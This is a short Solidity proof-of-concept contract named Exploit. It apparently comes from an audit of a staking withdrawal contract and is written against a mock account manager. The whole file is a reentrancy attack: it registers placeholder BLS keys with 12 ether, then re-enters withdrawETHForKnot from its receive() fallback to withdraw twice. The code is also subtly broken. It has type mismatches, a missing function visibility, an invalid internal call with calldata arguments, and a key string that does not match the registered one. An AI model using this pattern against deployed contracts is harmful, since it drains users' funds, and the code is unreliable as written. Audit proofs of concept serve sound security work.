pragma solidity 0.8.13;

import {MockAccountManager} from "../../contracts/testing/stakehouse/MockAccountManager.sol";


interface Iwithdraw {
    function withdrawETHForKnot(address recipient, bytes calldata _blsPublicKeyOfKnot ) external;
    function registerBLSPublicKeys(
        bytes[] calldata _blsPublicKeys,
        bytes[] calldata _blsSignatures,
        address _eoaRepresentative
    ) external payable;
}
contract Exploit {
    
    address _with;
    bool state;

    constructor(address withdraw) {
        Iwithdraw _withdraw= Iwithdraw(withdraw);
        _with=_withdraw;
        bytes [] memory publicKeys= new bytes[](2);
        publicKeys[0]="publicKey1";
        publicKeys[1]="publicKey2";
        
        bytes [] memory blsSignatures= new bytes[](2);
        blsSignatures[0]="blsSignature1";
        blsSignatures[1]="blsSignature2";

        _with.registerBLSPublicKeys{value: 12 ether}(publicKeys, blsSignatures, address(this));


    }

    function attack(bytes calldata _blsPublicKeyOfKnot) {
        _with.withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);
        
    }

    receive() external payable {
        if(!state) {
            state= true;
            attack("publicKeys1");
        }
    }

    
}